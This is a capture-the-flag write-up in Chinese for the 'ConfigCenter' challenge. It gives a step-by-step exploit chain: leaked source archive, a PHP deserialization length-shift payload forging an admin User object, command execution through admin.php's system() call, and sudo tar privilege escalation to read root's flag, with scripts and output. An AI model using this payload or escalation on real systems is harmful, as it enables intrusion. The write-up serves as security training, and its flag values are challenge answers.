# ConfigCenter CTF WP

## 1. 源码泄露

访问目标后发现配置恢复接口：

~~~text
POST /api/restore.php
参数：note、data
~~~

尝试访问备份文件，发现 /www.zip：

~~~bash
curl -k https://TARGET/www.zip -o www.zip
unzip www.zip -d www
~~~

源码包包含：

~~~text
index.php
api/restore.php
class/User.php
admin.php
config.php
loader.php
~~~

config.php 泄露了源码解密密钥：

~~~php
define('SITE_KEY', 'bd18306e92864e39');
~~~

## 2. 反序列化分析

restore.php 拼接序列化字符串后进行过滤和反序列化：

~~~php
$ser = 'a:2:{s:4:"note";s:' . strlen($note) . ':"' . $note .
       '";s:4:"data";s:' . strlen($data) . ':"' . $data . '";}';

$ser = safe_filter($ser);
$obj = @unserialize($ser);
~~~

过滤器：

~~~php
function safe_filter($s) {
    return str_replace('x', 'xy', $s);
}
~~~

User 类允许通过 __unserialize() 设置对象属性：

~~~php
class User {
    public $role = 'guest';

    public function __wakeup() {
        $this->role = 'guest';
    }

    public function __unserialize(array $data) {
        foreach ($data as $k => $v) {
            $this->$k = $v;
        }
    }
}
~~~

当 data 是 User 对象且 role=admin 时，程序设置管理员 Session：

~~~php
$_SESSION['is_admin'] = true;
~~~

## 3. 构造反序列化 Payload

过滤器将 x 替换成 xy，但序列化长度字段使用的是过滤前的长度，因此可以制造长度错位。

~~~python
inj = '";s:4:"data";O:4:"User":1:{s:4:"role";s:5:"admin";}}'
note = 'x' * len(inj) + inj
~~~

长度错位后，注入内容会被解析为新的 data 字段：

~~~text
User { role = admin }
~~~

PHP 8 使用 __unserialize()，因此对象中的 role 保持为 admin。

## 4. 恢复管理员会话

~~~python
import requests

requests.packages.urllib3.disable_warnings()

base = "https://eci-2ze9vqtiojxe9lqam0jd.cloudeci1.ichunqiu.com:80"

s = requests.Session()
s.verify = False

inj = '";s:4:"data";O:4:"User":1:{s:4:"role";s:5:"admin";}}'
note = 'x' * len(inj) + inj

r = s.post(
    base + "/api/restore.php",
    data={"note": note, "data": "A"}
)

print(r.text)
print(s.cookies)
~~~

返回：

~~~json
{"status":"ok","msg":"恢复成功，管理员会话已恢复"}
~~~

## 5. 命令执行

admin.php 中存在命令执行：

~~~php
system($_POST['cmd']);
~~~

使用同一个 Session 执行：

~~~python
r = s.post(base + "/admin.php", data={"cmd": "id"})
print(r.text)
~~~

结果：

~~~text
uid=33(www-data) gid=33(www-data) groups=33(www-data)
~~~

## 6. sudo 提权

检查 sudo 权限：

~~~bash
sudo -n -l
~~~

结果：

~~~text
User www-data may run the following commands:
    (root) NOPASSWD: /usr/bin/tar
~~~

利用 root 权限的 tar 读取 /root：

~~~bash
sudo -n tar -cf /tmp/root.tar -C /root .
tar -tvf /tmp/root.tar
tar -xf /tmp/root.tar -O
~~~

发现：

~~~text
./flag.txt
~~~

文件内容：

~~~text
flag{8ba7037e-2ceb-4d2a-8231-a1f3e0c9bbaf}
~~~

## Flag

~~~text
flag{8ba7037e-2ceb-4d2a-8231-a1f3e0c9bbaf}
~~~

## 漏洞链

~~~text
/www.zip 源码泄露
    ↓
restore.php 反序列化长度错位
    ↓
User 对象角色伪造为 admin
    ↓
admin.php 命令执行
    ↓
sudo tar root 权限
    ↓
读取 /root/flag.txt
~~~
